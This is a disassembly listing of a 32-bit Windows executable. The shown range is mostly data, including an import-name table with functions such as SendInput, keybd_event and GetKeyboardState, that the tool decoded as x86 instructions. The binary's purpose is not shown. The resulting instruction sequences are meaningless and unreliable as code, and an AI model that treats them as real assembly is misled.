  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
